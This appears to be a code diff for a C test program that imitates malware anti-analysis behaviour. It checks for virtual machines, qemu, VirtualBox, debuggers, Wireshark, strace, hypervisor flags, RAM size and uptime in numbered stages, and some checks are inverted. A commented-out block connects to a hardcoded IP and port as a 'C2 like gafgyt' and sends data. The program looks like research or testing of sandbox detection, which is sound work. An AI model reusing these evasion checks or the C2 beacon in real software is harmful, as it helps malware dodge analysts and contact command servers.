@@ -23,6 +23,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+
+
 static void fake_payload_stage() {
 
 	uint64_t x = 0x13371337;
@@ -50,8 +52,60 @@ static void decoy_stage() {
 }
 
 int main() {
+
+struct utsname info2;
+uname(&info2); // Getting System Information
+
+if (strcmp(info2.sysname, "Linux") != 0){ // Comparing the system name to "Linux"
+	exit(1); // Exit if the environment is not as expected
+}
+fprintf(stderr, "FOUND LINUX SYSTEM\n");
+
+	// int sock = socket(AF_INET, SOCK_STREAM, 0);
+	// for (int i = 0; i < 10; i++) {
+	//     int sock = socket(AF_INET, SOCK_STREAM, 0);
+	//     if (sock < 0) {
+	//         // fprintf(stderr, "FAILED at socket %d\n", i);
+	//         return 1;
+	//     }
+	//     // fprintf(stderr, "socket %d: fd=%d\n", i, sock);
+	//     // geen close!
+	// }
+	
+	// Connect naar C2 (zoals gafgyt)
+	// struct sockaddr_in addr = {0};
+	// addr.sin_family = AF_INET;
+	// addr.sin_port = htons(5515);
+	// inet_pton(AF_INET, "185.172.110.224", &addr.sin_addr);
+	// connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+	
+	// // Select op socket (zoals gafgyt)
+	// fd_set readfds;
+	// FD_ZERO(&readfds);
+	// FD_SET(sock, &readfds);
+	// struct timeval tv = {5, 0};
+	// select(sock + 1, &readfds, NULL, NULL, &tv);
+	
+	// // Stuur data
+	// char buf[1024] = {0};
+	// send(sock, buf, sizeof(buf), 0);
+	// recv(sock, buf, sizeof(buf), 0);
+	
+	// GEEN close() - zoals malware
+	// return 0;
 	// char *prog_name = argv[0];
 	// // fork();
+	
+	// Test socket cleanup - simuleert malware gedrag
+// fprintf(stderr, "SOCKET LOOP DONE\n");
+	
+// 	int sock = socket(AF_INET, SOCK_STREAM, 0);
+// 	int client = accept(sock, NULL, NULL);
+// 	if (client > 0) {
+// 		// fprintf(stderr, "ACCEPT SUCCEEDED: fd=%d\n", client);
+// 	} else {
+// 		// fprintf(stderr, "ACCEPT FAILED: %d\n", client);
+// 	}
 
 	int fd = open("/proc/self/status", O_RDONLY);
 	// fprintf(stderr, "open /proc/self/status fd=%d\n", fd);
@@ -59,7 +113,7 @@ int main() {
 		char buf[256] = {0};
 		read(fd, buf, sizeof(buf)-1);
 		// fprintf(stderr, "read: %s\n", buf);
-		close(fd);
+		// close(fd);
 	}
 
 	struct winsize ws;
@@ -76,27 +130,27 @@ int main() {
 // 	// fprintf(stderr, "ioctl check voorbijjjjj\n");
 	struct utsname uts;
 
-	// for(volatile int i = 0; i < 100000; i++)
-	// {
-	// 	uname(&uts);
-	// }
+// 	// for(volatile int i = 0; i < 100000; i++)
+// 	// {
+// 	// 	uname(&uts);
+// 	// }
 	if (uname(&uts) != 0)
 		return 0;
-	// wont get thourgh this yet probs
+// 	// wont get thourgh this yet probs
 
-	// for(volatile int i = 0; i < 100000; i++)
-	// {
-	// 	uname(&uts);
-	// }
-	// printf(
-	// 	"bytes=%02x %02x %02x %02x\n",
-	// 	(unsigned char)uts.sysname[0],
-	// 	(unsigned char)uts.sysname[1],
-	// 	(unsigned char)uts.sysname[2],
-	// 	(unsigned char)uts.sysname[3]
-	// );
+// 	// for(volatile int i = 0; i < 100000; i++)
+// 	// {
+// 	// 	uname(&uts);
+// 	// }
+// 	// printf(
+// 	// 	"bytes=%02x %02x %02x %02x\n",
+// 	// 	(unsigned char)uts.sysname[0],
+// 	// 	(unsigned char)uts.sysname[1],
+// 	// 	(unsigned char)uts.sysname[2],
+// 	// 	(unsigned char)uts.sysname[3]
+// 	// );
 
-	// fprintf(stderr, "uts.sysname = \"%s\"\n", uts.sysname);
+// 	// fprintf(stderr, "uts.sysname = \"%s\"\n", uts.sysname);
 
 	if (!strstr(uts.sysname, "Linux"))
 		return 0;
@@ -133,10 +187,11 @@ int main() {
 		return 0;
 	// printf("hier4");
 
+	// if (info.totalram != (4ULL * 1024 * 1024 * 1024)) // lastig i guess
 
-	if (info.totalram != (4ULL * 1024 * 1024 * 1024))
+	if (info.totalram != (4ULL * 1024* 1024 * 1024))
 		return 0;
-	// // printf("hier5");
+	// printf("hier5");
 
 
 	if (info.uptime < 600)
@@ -168,20 +223,20 @@ int main() {
 	// // printf("hier");
 	if (!strstr(exe_path, "qemu"))
 		return 0;
-	printf("\nhier1");
+	// printf("\nhier1");
 	
 
 	if (strstr(exe_path, "sandbox"))
 		return 0;
-	printf("hier2");
+	// printf("hier2");
 
 	if (strstr(exe_path, "tmp"))
 		return 0;
-	printf("hier3");
+	// printf("hier3");
 
 	if (access("/dev/vboxguest", F_OK) == 0)
 		return 0;
-	printf("hier4");
+	// printf("hier4");
 
 	fprintf(stderr, "------ STAGE 3 EXECUTION_CONTEXT\n");
 	// fflush(stdout);
@@ -208,7 +263,7 @@ int main() {
 	if (memmem(dentbuf, dent_n, "wireshark", 9))
 		return 0;
 
-	if (memmem(dentbuf, dent_n, "gdb", 3))
+	if (!memmem(dentbuf, dent_n, "gdb", 3))
 		return 0;
 
 	if (memmem(dentbuf, dent_n, "strace", 6))
@@ -231,7 +286,7 @@ int main() {
 
 	close(cpu_fd);
 
-	if (strstr(cpuinfo, "hypervisor"))
+	if (!strstr(cpuinfo, "hypervisor"))
 		return 0;
 
 	fprintf(stderr, "---------- STAGE 5 CPU_ENVIRONMENT\n");
@@ -253,7 +308,7 @@ int main() {
 	if (stat("/proc/self/exe", &st) != 0)
 		return 0;
 
-	if (st.st_uid == 1337)
+	if (st.st_uid != 1337)
 		return 0;
 
 	fprintf(stderr, "-------------- STAGE 7 FILE_METADATA\n");
